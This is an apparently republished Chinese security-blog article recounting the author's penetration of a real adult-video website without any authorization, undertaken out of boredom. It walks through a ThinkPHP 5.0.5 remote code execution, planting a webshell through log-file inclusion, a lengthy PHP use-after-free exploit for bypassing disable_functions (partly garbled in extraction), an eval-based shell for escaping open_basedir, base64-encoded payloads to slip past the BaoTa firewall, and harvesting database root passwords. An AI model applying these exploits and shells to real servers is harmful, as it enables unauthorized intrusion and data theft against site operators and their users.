对⼀次宅男⽹站的渗透 ⽹络安全⾏业
- FreeBuf
⻔户
因为有⼈在云盘群组⾥⾯发了某宅男⽹站链接，闲的⽆聊，职业病⼜犯了。
“
0x00 锁定⽬标初步尝试
起因是因为云盘，因为有⼈在云盘群组⾥⾯发了某宅男⽹站链接，闲的⽆聊，职业病⼜犯了
打开⽹站，做了⼀下简单的信息收集发现是 ThinkPHP V5.0.5，通过泄露信息得到⽹站真实 IP
直接使⽤ RCE 漏洞，成功执⾏ phpinfo
0x01 初探绕过 disable_functions：
准备直接执⾏命令，弹 shell，发现函数被禁⽤：
看了下 disable_functions 禁⽤了以下函数：
拿到 shell 再说，⾸先在⽇志中先写⼊⼀句话，然后利⽤⽂件包含去包含⽇志执⾏代码，⼤概思路就是这
样，先利⽤报错把⼀句话写⼊⽇志：
因为⽇志会不断刷新，因此这⾥需要包含⽇志重新写⼊⼀句话：
成功拿到 shell：
经过查找资料，多次尝试以后发现可以通过 PHP 7.0 =0; $j--) {
$address >= 8;
}
return $out;
}
function write(&$str, $p, $v, $n = 8) {
$i = 0;
for($i = 0; $i >= 8;
}
}
function leak($addr, $p = 0, $s = 8) {
global $abc, $helper;
write($abc, 0x68, $addr + $p - 0x10);
$leak = strlen($helper->a);
if($s != 8) { $leak %= 2  0 && $leak - $base  0 && $leak - $base chtg = $this->ryat;
$this->ryat = 1;
}
}
class Helper {
public $a, $b, $c, $d;
}
if(stristr(PHP_OS, 'WIN')) {
die('This PoC is for *nix systems only.');
}
$n_alloc = 10; # increase this value if you get segfaults
$contiguous = [];
for($i = 0; $i b = function ($x) { };
if(strlen($abc) == 79) {
die("UAF failed");
}
# leaks
$closure_handlers = str2ptr($abc, 0);
$php_heap = str2ptr($abc, 0x58);
$abc_addr = $php_heap - 0xc8;
# fake value
write($abc, 0x60, 2);
write($abc, 0x70, 6);
# fake reference
write($abc, 0x10, $abc_addr + 0x60);
write($abc, 0x18, 0xa);
$closure_obj = str2ptr($abc, 0x20);
$binary_leak = leak($closure_handlers, 8);
if(!($base = get_binary_base($binary_leak))) {
die("Couldn't determine binary base address");
}
if(!($elf = parse_elf($base))) {
die("Couldn't parse ELF header");
}
if(!($basic_funcs = get_basic_funcs($base, $elf))) {
die("Couldn't get basic_functions address");
}
if(!($zif_system = get_system($basic_funcs))) {
die("Couldn't get zif_system address");
}
# fake closure object
$fake_obj_offset = 0xd0;
for($i = 0; $i b)($cmd);
exit();
}
上传代码脚本到⽬标服务器上，成功执⾏ set
0x02 深⼊绕过 open_basedir：
发现⽬标不能访问根⽬录，查看⼀下 phpinfo 发现 open_basedir 函数限制了访问⽬录：
使⽤代码：
';
echo 'GET: '.$_GET['c'].'';
eval($_GET['c']);
echo 'open_basedir: '.ini_get('open_basedir');
?>
成功突破⽬录限制：
通过敏感信息收集读取到⽇志⽂件，发现⽬标存在 phpmyadmin：
得到⽬录 phpmyadmin 路径后判断出⽬标使⽤了宝塔，宝塔⼀般默认把 phpmyadmin 搭建在 888 端⼝上
⾯：
找到数据库密码，登录之：
80 多万访问 IP 这⽹站有点逆天，播放次数那么多的那位⽼哥，注意身体啊，由于 MySQL 权限不够，于是
不考虑继续利⽤ MySQL：
0x03 再探绕过宝塔防⽕墙：
由于某些原因，渗透搁置了⼀段时间，再次来看的时候发现⻢被删除了，重新拿 shell 的时候发现对⽅开了
宝塔的防⽕墙
怎么办，不能怂，继续怼它，对宝塔返回信息判断，应该是只对传⼊的参数做了判断，判断是否有敏感函
数，并没有对⽂件内容做验证，修改了下 exp，在次成功写⼊ shell：
访问：http://XXXXX/12345678.php 就会在根⽬录下⽣成 2222222.php ⽂件
2222222.php 的⽂件内容
//把参数以base64形式传⼊，然后解嘛，这样就能绕过宝塔对参数的检测
代码执⾏成功：
看了下时间，半夜 2 点了，睡觉了，第⼆天还要上班，于是关掉了电脑，下班后，继续打开⽹站，发现⽹站
漏洞不能利⽤了，⼀下⼦开始发慌了：
冷静⼀下，想其他办法，⼀般这样的⽹站都不⽌⼀个 ip，扫⼀下 c 段看看有没有收获, 最终发现隔壁 ip
（xxx.xxx.xxx.42）和⽬标（xxx.xxx.xxx.43）⼀模⼀样，此 ip 开启了 dubug 可以存在漏洞，于是直接搞：
查看⼀下以 root ⽤户运⾏的进程发现 MySQL 是 root 权限运⾏：
通过查看 mysqld_safe 的配置⽂件（/etc/my.cnf）发现 root ⽤户密码：
尝试了 UDF 提权，root ⽤户登录 phpmyadmin，看下 MySQL 版本 5.6.47-log
在看下 / www/server/mysql/lib/plugin ⽬录权限，不可写，放弃 udf 提权：
打算劫持来提权的，但是发现 www ⽤户是 nologin ⽤户，不存在⾃⼰的家⽬录，也没有. bash_profile 这个
⽂件，所以劫持不了命令了
可惜了，最终尝试了多种提权⽅法都失败了，但在整个渗透的过程中，还是有⽐较多值得回味的过程，因此
写下了这篇⽂章，希望能给⼤家更多的启发。
本⽂知识点：
1. 通过 thinkphp5.0 * 代码执⾏漏洞包含⽇志⽂件拿 shell
2. 绕过 disable_functions 禁⽤函数
3. 绕过 open_basedir ⽬录限制
4. 绕过宝塔防⽕墙
最后如果⼤佬们有好的提权⽅法，私聊我哦～
全⽂完
本⽂由 简悦 SimpRead 转码，⽤以提升阅读体验，原⽂地址
|---|--|--|
| 0 |  |  |
| 1 |  |  |